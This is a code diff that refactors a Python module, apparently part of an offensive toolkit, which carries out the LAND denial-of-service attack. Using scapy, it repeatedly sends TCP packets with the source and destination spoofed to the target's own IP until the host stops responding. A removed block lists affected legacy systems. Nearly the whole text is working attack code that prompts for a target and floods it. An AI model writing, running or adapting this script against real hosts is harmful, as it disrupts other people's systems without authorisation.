@@ -1,48 +1,42 @@
 from scapy.all import *
-from util import Msg, Error
-import commands
+from dos import DoS
+import util
 
 #
 # Module exploits the Windows LAND attack.  This DoS essentially sends a packet with the source and destination
 # as the target host, so it will send itself packets infinitely until crash.
 # Original cvs here: http://insecure.org/sploits/land.ip.DOS.html
 #
-def initialize():
-	# supress scapy output
-	conf.verb = 0
+__name__ = 'LAND DoS'
+class LANDDoS(DoS):
+	def __init__(self):
+		super(LANDDoS,self).__init__('LAND DoS')
 
-	try:
-		ip = raw_input('[!] Enter IP to DoS: ')
-		tmp = raw_input('[!] LAND attack at ip %s.  Is this correct? '%ip)
-		if tmp == 'n':
+	def initialize(self):
+		# supress scapy output
+		conf.verb = 0
+
+		try:
+			self.target = raw_input('[!] Enter IP to DoS: ')
+			tmp = raw_input('[!] LAND attack at ip %s.  Is this correct? '%self.target)
+			if 'n' in tmp.lower():
+				return
+
+			while True:
+				print '[!] DoSing %s...'%self.target
+				send(IP(src=self.target,dst=self.target)/TCP(sport=134, dport=134))
+
+				if self.is_alive():
+					util.Msg('Host appears to still be up.')
+					try:
+						tmp = raw_input('[!] Try again? ')
+					except Exception:
+						break
+					if 'n' in tmp.lower():
+						break
+				else:
+					util.Msg('Host not responding!')
+					break
+		except Exception, j:
+			util.Error('Error: %s'%j)
 			return
-		while True:
-			print '[!] DoSing %s...'%ip
-			send(IP(src=ip,dst=ip)/TCP(sport=134, dport=134))
-			print '[!] Checking target..'
-			rval = commands.getoutput('ping -c 1 -w 1 %s'%ip)
-			up = re.search("\d.*? received", rval)
-			if re.search('0', up.group(0)) is None:
-				Msg('Host appears to still be up.')
-				try:
-					tmp = raw_input('[!] Try again? ')
-				except Exception:
-					break
-				if tmp == 'n':
-					break
-			else:
-				Msg('Host not responding!')
-				break
-	except Exception, j:
-		Error('Error: %s'%j)
-		return
-#
-#
-#
-def info():
-	print '''[!] LAND DOS ATTACK
-	      [systems]: AIX 3
-		  			 BSDI 2.0-2.1
-					 FreeBSD 2.2.5
-					 Windows 95-Windows NT + SP3
-		  '''	
